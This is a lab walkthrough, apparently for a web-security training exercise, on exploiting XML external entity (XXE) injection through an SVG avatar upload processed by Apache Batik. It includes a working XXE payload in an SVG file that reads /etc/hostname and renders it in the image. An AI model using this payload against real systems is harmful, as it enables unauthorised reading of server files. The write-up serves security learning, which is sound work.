# Lab: Exploiting XXE via image file upload

 This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname. 

**HINT**

*The SVG image format uses XML.*

# Step 1 Walk the application's image upload function

I find an avatar upload function when commenting on a blog-post:

![image](https://user-images.githubusercontent.com/83407557/210593803-4a3b31fe-ab83-4ff9-a145-7e9ec5c2f0f6.png)


I see that SVG's are a supported file type for images:

![image](https://user-images.githubusercontent.com/83407557/210594209-5bbc3854-1d11-4e2e-b438-96250d5bb326.png)

![image](https://user-images.githubusercontent.com/83407557/210594314-f1c21911-8828-4f3c-a89b-7b4d1deef3b5.png)

If I look at my svg file, it can be seend that it contains XML:

```bash
└─$ head banana.svg   
<?xml version="1.0" encoding="utf-8"?><svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 111.81 122.88" style="enable-background:new 0 0 111.81 122.88" xml:space="preserve"><style type="text/css">.st0{fill:#7A2E00;} .st1{fill:#FCEB8F;} .st2{fill:#FEDA00;} .st3{fill:#FDF2B4;} .st4{fill:#F5A800;}</style><g><path class="st0" d="M11.22,66.83c-1.71-4.59-3.11-9.33-4.23-14.18c-1.29-5.54-2.21-11.24-2.8-17.03C3.76,31.35,3.05,23.4,3.9,16.2 C4.83,8.42,7.57,1.48,14.32,0.19c11.52-2.2,16.95,15.47,20.2,26.01c0.51,1.67,0.97,3.15,1.37,4.28c1.09,3.1,2.18,6.08,3.31,8.97 c0.84,2.15,1.69,4.22,2.55,6.21c0.26-0.16,0.52-0.3,0.79-0.45c1.89-1,3.94-1.62,6.07-1.91c4.24-0.58,8.43,0.03,12.37,1.45 c4.37,1.57,8.43,4.15
```

# Step 2 Create malicious SVG

I can use the following XML in a local file, and rename it to a .svg file:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">
&xxe;
</text></svg>
```

```bash
└─$ cat xxe.svg   
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

# Step 3 upload malicious xxe.svg file

![image](https://user-images.githubusercontent.com/83407557/210600604-c50db290-f211-4337-afcf-e49ea5418ddf.png)

![image](https://user-images.githubusercontent.com/83407557/210600811-78834c3e-0b93-4155-96ef-75d41cce1b22.png)
![image](https://user-images.githubusercontent.com/83407557/210600862-80bd431b-2d31-4a59-b5bc-7844fbec27d9.png)

# Step 4 inspect SVG

![image](https://user-images.githubusercontent.com/83407557/210601135-ecc7ef93-3fb1-41a5-adc3-8dc1fa6aa0ed.png)

I open the avatar in a new page and see the embeded hostname:

![image](https://user-images.githubusercontent.com/83407557/210601239-b2273a5a-3555-4e6e-b808-d9a3b0b60e97.png)


# Step 5 submit hostname

![image](https://user-images.githubusercontent.com/83407557/210601662-f5c34f18-adcd-4767-9051-24f8b684a328.png)

which solves the lab

![image](https://user-images.githubusercontent.com/83407557/210601712-00205216-08fc-43c1-bff7-0c6969fcfa29.png)


